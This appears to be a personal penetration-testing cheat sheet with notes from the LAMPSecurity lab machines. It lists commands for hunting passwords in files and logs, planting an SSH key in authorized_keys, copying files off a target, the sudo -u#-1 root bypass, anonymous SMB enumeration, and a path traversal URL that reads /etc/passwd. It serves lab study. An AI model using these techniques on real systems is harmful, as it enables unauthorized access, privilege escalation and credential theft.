# interesting commands

```
echo LinEnum.sh | base64 |xclip -selection clipboard
grep -R password file_name
grep password . -B1 : get also the element before.
grep passwd /var/log/auth.log : permet de savoir la date de changement des mots de pass

```
if in the target system there is .ssh folder,I can generate my pub,priv key with **keygen -f name** and copy my public key and paste it inside .ssh (authorized_keys) ====>>> then I can connect with my private key: **ssh -i privkey user@targetip**.

```
scp -i privatekey user@targetip:/home/user.txt . : transfert user.txt to my local directory
```
## sudo abusing
```
vi visudo : to open the file listed with sudo -l
if in the file there is: user  ALL=(ALL,!root) ALL
I can run any commande with root priviledge like this: sudo -u#-1 /bin/bash  => BOOM,root access
ALso: user  ALL=(ALL,!abdo) ALL, I can have root access: sudo -u#-1 /bin/bash
bug fixed in 1.8.28  => get your current version $ sudo -V
```
#### LAMPSecurity-4
what I had learn from this machine is:
```
authenticity with private key with ssh : copy my public key to .ssh/authorized_key 
id => cat /etc/group, find / -group grp_name -type f 2>/dev/null
```
#### LAMPSecurity-5
what I had learn from this machine is:
```
smbclient --list //10.0.4.13/ -U "" : list the shared folders
smbclient //10.0.4.13/folder/ -U "" : get in 
grep -Ri password /home/*   : 
searchsploit linux kernel 2.6 : deux chiffre
ls /etc | grep release : know the distribution of the OS
https://10.0.4.13/?page=/../../../etc/passwd%00
```
